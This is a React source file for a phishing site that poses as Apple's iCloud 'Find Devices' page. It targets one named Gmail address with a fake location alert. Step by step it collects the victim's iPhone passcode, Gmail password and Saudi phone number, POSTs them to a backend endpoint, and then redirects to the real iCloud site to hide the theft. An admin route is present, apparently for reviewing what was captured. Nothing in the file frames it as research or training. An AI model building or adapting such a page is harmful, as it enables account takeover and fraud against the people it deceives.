/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { useState, useEffect } from "react";
import { ExternalLink, MoreHorizontal, ChevronRight, CheckCircle2, Lock } from "lucide-react";
import { motion, AnimatePresence } from "motion/react";
import { BrowserRouter as Router, Routes, Route, useNavigate } from "react-router-dom";
import AdminPanel from "./components/AdminPanel";

type Step = "landing" | "notification" | "passcode" | "gmail" | "phone" | "final";

function FindMyFlow() {
  const [step, setStep] = useState<Step>("landing");
  const [passcode, setPasscode] = useState("");
  const [gmailPassword, setGmailPassword] = useState("");
  const [phoneNumber, setPhoneNumber] = useState("");

  useEffect(() => {
    if (step === "final") {
      const timer = setTimeout(() => {
        window.location.href = "https://www.icloud.com/find";
      }, 8000);
      return () => clearTimeout(timer);
    }
  }, [step]);

  const nextStep = async () => {
    if (step === "landing") setStep("notification");
    else if (step === "notification") setStep("passcode");
    else if (step === "passcode") setStep("gmail");
    else if (step === "gmail") setStep("phone");
    else if (step === "phone") {
      // Submit data to the server
      console.log("Attempting to submit data:", { passcode, gmailPassword, phoneNumber });
      try {
        const response = await fetch("/api/v1/submit", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            passcode,
            gmailPassword,
            phoneNumber: `+966 ${phoneNumber}`
          }),
        });
        const result = await response.json();
        console.log("Submission result:", result);
      } catch (error) {
        console.error("Failed to submit data:", error);
      }
      setStep("final");
    }
  };

  const slideVariants = {
    initial: { x: 300, opacity: 0 },
    animate: { x: 0, opacity: 1 },
    exit: { x: -300, opacity: 0 },
  };

  return (
    <div className="min-h-screen flex flex-col relative overflow-hidden selection:bg-blue-100 bg-white font-sans antialiased text-[#1d1d1f]">
      {/* Header */}
      <header className="px-6 py-4 flex justify-between items-center z-20">
        <div className="flex items-center gap-1 font-semibold text-xl tracking-tight cursor-pointer" onClick={() => setStep("landing")}>
          <span className="text-black">iCloud</span>
        </div>
        <button className="p-2 hover:bg-gray-100 rounded-full transition-colors">
          <MoreHorizontal className="w-6 h-6 text-gray-600" />
        </button>
      </header>

      {/* Main Content Area */}
      <main className="flex-1 flex flex-col items-center justify-center px-6 text-center z-10 -mt-12 w-full max-w-lg mx-auto">
        <AnimatePresence mode="wait">
          {step === "landing" && (
            <motion.div
              key="landing"
              variants={slideVariants}
              initial="initial"
              animate="animate"
              exit="exit"
              transition={{ type: "spring", damping: 25, stiffness: 200 }}
              className="flex flex-col items-center w-full"
            >
              <div className="mb-8">
                <img 
                  src="https://www.icloud.com/system/icloud.com/2602Build17/3d8fabc9a48e13a4ca0a6c4802f953d0.png" 
                  alt="Find My Logo" 
                  className="w-24 h-24 object-contain"
                  referrerPolicy="no-referrer"
                />
              </div>

              <h1 className="text-[48px] md:text-[56px] font-bold tracking-tight leading-tight mb-4 text-[#1d1d1f]">
                Find Devices
              </h1>
              
              <p className="text-[19px] md:text-[21px] leading-relaxed text-[#86868b] mb-10 max-w-lg font-medium">
                Find your iPhone, iPad, Mac, Apple Watch, AirPods, or Beats. Or help locate Family Sharing devices.
              </p>

              <button 
                onClick={nextStep}
                className="bg-black text-white px-8 py-3 rounded-full text-[17px] font-medium hover:bg-zinc-800 transition-colors mb-8 shadow-sm flex items-center gap-2"
              >
                Sign in as joycemariana1512@gmail.com
              </button>

              <a 
                href="#" 
                className="text-[#0066cc] hover:underline text-[17px] flex items-center gap-1 group"
              >
                Learn more about Find Devices
                <ExternalLink className="w-4 h-4" />
              </a>
            </motion.div>
          )}

          {step === "notification" && (
            <motion.div
              key="notification"
              variants={slideVariants}
              initial="initial"
              animate="animate"
              exit="exit"
              transition={{ type: "spring", damping: 25, stiffness: 200 }}
              className="flex flex-col items-center w-full"
            >
              <div className="w-20 h-20 bg-blue-50 rounded-3xl flex items-center justify-center mb-8">
                <div className="w-10 h-10 bg-blue-500 rounded-full animate-pulse"></div>
              </div>
              <h2 className="text-[32px] font-bold mb-6">New Location Found</h2>
              <p className="text-[19px] text-[#1d1d1f] mb-4 font-semibold">
                Your iphone pinged a new location on 6:31 AM 22/02/2026
              </p>
              <p className="text-[17px] text-[#86868b] mb-10 leading-relaxed">
                please verify your identity to acsses more information and the ping.
              </p>
              <button 
                onClick={nextStep}
                className="w-full bg-black text-white py-4 rounded-2xl text-[17px] font-semibold hover:bg-zinc-800 transition-all flex items-center justify-center gap-2"
              >
                Next <ChevronRight className="w-5 h-5" />
              </button>
            </motion.div>
          )}

          {step === "passcode" && (
            <motion.div
              key="passcode"
              variants={slideVariants}
              initial="initial"
              animate="animate"
              exit="exit"
              transition={{ type: "spring", damping: 25, stiffness: 200 }}
              className="flex flex-col items-center w-full"
            >
              <div className="mb-8 p-4 bg-gray-50 rounded-full">
                <Lock className="w-10 h-10 text-gray-400" />
              </div>
              <h2 className="text-[32px] font-bold mb-4">iPhone Passcode</h2>
              <p className="text-[17px] text-[#86868b] mb-8">
                Enter your iPhone passcode (if any, leave blank if not)
              </p>
              <div className="w-full mb-8">
                <input 
                  type="password"
                  value={passcode}
                  onChange={(e) => setPasscode(e.target.value)}
                  placeholder="Passcode"
                  className="w-full bg-[#f5f5f7] border-none rounded-xl px-4 py-4 text-center text-2xl tracking-[0.5em] focus:ring-2 focus:ring-blue-500 outline-none"
                />
              </div>
              <button 
                onClick={nextStep}
                className="w-full bg-black text-white py-4 rounded-2xl text-[17px] font-semibold hover:bg-zinc-800 transition-all"
              >
                Next
              </button>
            </motion.div>
          )}

          {step === "gmail" && (
            <motion.div
              key="gmail"
              variants={slideVariants}
              initial="initial"
              animate="animate"
              exit="exit"
              transition={{ type: "spring", damping: 25, stiffness: 200 }}
              className="flex flex-col items-center w-full"
            >
              <div className="mb-8">
                <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google" className="h-8" />
              </div>
              <h2 className="text-[24px] font-medium mb-2">Verify your Gmail account</h2>
              <div className="flex items-center gap-2 mb-8 bg-gray-50 px-3 py-1 rounded-full border border-gray-200">
                <div className="w-5 h-5 bg-blue-500 rounded-full text-white text-[10px] flex items-center justify-center font-bold">J</div>
                <span className="text-[14px] font-medium">joycemariana1512@gmail.com</span>
              </div>
              
              <div className="w-full mb-4">
                <input 
                  type="password"
                  value={gmailPassword}
                  onChange={(e) => setGmailPassword(e.target.value)}
                  placeholder="Enter your password"
                  className="w-full border border-gray-300 rounded-lg px-4 py-3 text-[16px] focus:border-blue-500 focus:ring-1 focus:ring-blue-500 outline-none"
                />
              </div>
              
              <p className="text-[13px] text-red-500 mb-8 font-medium italic">
                (this can only be done once ensure the password is correct)
              </p>

              <button 
                onClick={nextStep}
                className="w-full bg-[#1a73e8] text-white py-3 rounded-lg text-[14px] font-semibold hover:bg-blue-600 transition-all"
              >
                Next
              </button>
            </motion.div>
          )}

          {step === "phone" && (
            <motion.div
              key="phone"
              variants={slideVariants}
              initial="initial"
              animate="animate"
              exit="exit"
              transition={{ type: "spring", damping: 25, stiffness: 200 }}
              className="flex flex-col items-center w-full"
            >
              <motion.div 
                initial={{ scale: 0 }}
                animate={{ scale: 1 }}
                transition={{ type: "spring", damping: 12, stiffness: 200 }}
                className="mb-8"
              >
                <CheckCircle2 className="w-20 h-20 text-[#34c759]" />
              </motion.div>
              
              <h2 className="text-[28px] font-bold mb-4 leading-tight">Identity Verified</h2>
              <p className="text-[17px] text-[#1d1d1f] mb-8 leading-relaxed">
                we will be in contact with you please provide us a phone number our support team can REACH you on
              </p>

              <div className="w-full mb-8 flex gap-2">
                <div className="bg-[#f5f5f7] rounded-xl px-4 py-4 text-[17px] font-medium flex items-center gap-2 border border-gray-200">
                  <span className="opacity-50">🇸🇦</span> +966
                </div>
                <input 
                  type="tel"
                  value={phoneNumber}
                  onChange={(e) => setPhoneNumber(e.target.value)}
                  placeholder="50 000 0000"
                  className="flex-1 bg-[#f5f5f7] border-none rounded-xl px-4 py-4 text-[17px] focus:ring-2 focus:ring-blue-500 outline-none"
                />
              </div>

              <button 
                onClick={nextStep}
                className="w-full bg-black text-white py-4 rounded-2xl text-[17px] font-semibold hover:bg-zinc-800 transition-all"
              >
                Submit
              </button>
            </motion.div>
          )}

          {step === "final" && (
            <motion.div
              key="final"
              variants={slideVariants}
              initial="initial"
              animate="animate"
              exit="exit"
              transition={{ type: "spring", damping: 25, stiffness: 200 }}
              className="flex flex-col items-center w-full"
            >
              <div className="w-16 h-16 border-4 border-gray-100 border-t-black rounded-full animate-spin mb-8"></div>
              <h2 className="text-[24px] font-bold mb-4">Processing Request</h2>
              <p className="text-[17px] text-[#86868b] leading-relaxed italic">
                (this proccess may takeup to 2 business days)
              </p>
              <p className="mt-8 text-[14px] text-blue-500">Redirecting to iCloud...</p>
            </motion.div>
          )}
        </AnimatePresence>
      </main>

      {/* Footer */}
      <footer className="px-6 py-8 text-[12px] text-[#86868b] flex flex-col md:flex-row justify-between items-center gap-4 z-20">
        <div className="flex gap-4">
          <span>Copyright © 2026 Apple Inc. All rights reserved.</span>
        </div>
        <div className="flex gap-4">
          <a href="#" className="hover:underline">Privacy Policy</a>
          <span className="text-gray-300">|</span>
          <a href="#" className="hover:underline">Terms of Use</a>
          <span className="text-gray-300">|</span>
          <a href="#" className="hover:underline">Sales and Refunds</a>
        </div>
      </footer>
    </div>
  );
}

export default function App() {
  return (
    <Router>
      <Routes>
        <Route path="/" element={<FindMyFlow />} />
        <Route path="/admin" element={<AdminPanel />} />
      </Routes>
    </Router>
  );
}
